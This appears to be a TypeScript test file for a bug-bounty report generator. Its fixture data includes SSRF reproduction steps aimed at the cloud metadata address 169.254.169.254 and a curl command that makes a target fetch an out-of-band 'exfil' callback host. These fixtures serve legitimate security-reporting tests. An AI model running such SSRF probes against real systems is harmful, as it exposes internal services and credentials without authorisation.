import { expect } from 'chai';

import { type OastCallback, type SandboxExecResult } from '../src/core/dast/dast-schema.js';
import {
  type BountyFindingData,
  generateBountyReport,
  generateFindingsIndex,
  generatePerFindingReport,
} from '../src/core/output/bounty-report-generator.js';

describe('bounty-report-generator', () => {
  const mockFinding: BountyFindingData = {
    cweId: 'CWE-918',
    impactDescription: 'An attacker can access internal services by exploiting the SSRF vulnerability.',
    remediationSummary: 'Validate and whitelist URLs before making server-side requests.',
    reproductionSteps: [
      'Navigate to /api/proxy endpoint',
      'Set the URL parameter to http://169.254.169.254/latest/meta-data/',
      'Observe that the server fetches and returns the internal metadata',
    ],
    severityLabel: 'Critical',
    summary: 'The /api/proxy endpoint allows server-side request forgery via an unvalidated URL parameter.',
    title: 'Server-Side Request Forgery in Proxy Endpoint',
    vulnId: 'SHADOW-CWE-918-abc123',
  };

  const mockSandboxLog: SandboxExecResult = {
    command: 'curl -X POST http://target:3000/api/proxy -d \'{"url":"http://oast-token.shadow.local"}\'',
    durationMs: 250,
    exitCode: 0,
    stderr: '',
    stdout: '{"status":"ok","data":"internal-metadata"}',
    timestamp: '2024-01-15T10:30:00.000Z',
  };

  const mockOastCallback: OastCallback = {
    headers: { 'user-agent': 'node-fetch/2.6.7' },
    method: 'GET',
    timestamp: '2024-01-15T10:30:01.000Z',
    url: 'http://oast-token.shadow.local/exfil',
  };

  describe('generatePerFindingReport', () => {
    it('should render a complete finding report', () => {
      const report = generatePerFindingReport(mockFinding, [mockSandboxLog], [mockOastCallback]);

      // Header
      expect(report).to.include('[CWE-918]');
      expect(report).to.include('Server-Side Request Forgery');
      expect(report).to.include('**Severity:** Critical');

      // Summary
      expect(report).to.include('### Summary');
      expect(report).to.include('unvalidated URL parameter');

      // Steps to Reproduce
      expect(report).to.include('### Steps to Reproduce');
      expect(report).to.include('1. Navigate to /api/proxy');
      expect(report).to.include('2. Set the URL parameter');
      expect(report).to.include('3. Observe that');

      // Proof of Concept
      expect(report).to.include('### Proof of Concept');
      expect(report).to.include('captured verbatim');
      expect(report).to.include('NOT been modified by AI');
      expect(report).to.include('curl -X POST');
      expect(report).to.include('internal-metadata');

      // OAST Callback
      expect(report).to.include('### OAST Callback Evidence');
      expect(report).to.include('oast-token.shadow.local');

      // Impact
      expect(report).to.include('### Impact');

      // Remediation
      expect(report).to.include('### Suggested Remediation');
      expect(report).to.include('whitelist URLs');

      // References
      expect(report).to.include('cwe.mitre.org/data/definitions/918');
      expect(report).to.include('owasp.org');
    });

    it('should omit PoC section when no sandbox logs', () => {
      const report = generatePerFindingReport(mockFinding, [], []);
      expect(report).to.not.include('### Proof of Concept');
    });

    it('should omit OAST section when no callbacks', () => {
      const report = generatePerFindingReport(mockFinding, [mockSandboxLog], []);
      expect(report).to.not.include('### OAST Callback Evidence');
    });

    it('should omit remediation section when not provided', () => {
      const findingNoRemediation = { ...mockFinding, remediationSummary: undefined };
      const report = generatePerFindingReport(findingNoRemediation, [], []);
      expect(report).to.not.include('### Suggested Remediation');
    });
  });

  describe('generateBountyReport', () => {
    it('should generate a full report with header and all sections', () => {
      const report = generateBountyReport({
        findings: [mockFinding],
        oastCallbacks: [mockOastCallback],
        platform: 'hackerone',
        sandboxLogs: [mockSandboxLog],
        targetName: 'TestApp',
      });

      expect(report).to.include('Security Assessment Report — TestApp');
      expect(report).to.include('Platform: HackerOne');
      expect(report).to.include('## Executive Summary');
      expect(report).to.include('**1** security finding(s)');
      expect(report).to.include('## Table of Contents');
      expect(report).to.include('[CWE-918]');
    });

    it('should support generic platform', () => {
      const report = generateBountyReport({
        findings: [mockFinding],
        targetName: 'GenericApp',
      });

      expect(report).to.include('Security Assessment Report — GenericApp');
      expect(report).to.not.include('Platform:');
    });

    it('should support bugcrowd platform', () => {
      const report = generateBountyReport({
        findings: [mockFinding],
        platform: 'bugcrowd',
        targetName: 'BugcrowdApp',
      });

      expect(report).to.include('Platform: Bugcrowd');
    });

    it('should generate severity breakdown table', () => {
      const criticalFinding = { ...mockFinding, severityLabel: 'Critical' };
      const highFinding = { ...mockFinding, cweId: 'CWE-79', severityLabel: 'High', title: 'XSS', vulnId: 'SHADOW-CWE-079-def456' };

      const report = generateBountyReport({
        findings: [criticalFinding, highFinding],
        targetName: 'App',
      });

      expect(report).to.include('| Critical | 1 |');
      expect(report).to.include('| High | 1 |');
    });
  });

  describe('generateFindingsIndex', () => {
    it('should generate a linked index of findings', () => {
      const index = generateFindingsIndex([mockFinding], 'TestApp');

      expect(index).to.include('Security Findings — TestApp');
      expect(index).to.include('1 finding(s)');
      expect(index).to.include('SHADOW-CWE-918-abc123');
      expect(index).to.include('SHADOW-CWE-918-abc123.md');
      expect(index).to.include('Critical');
      expect(index).to.include('CWE-918');
    });
  });
});
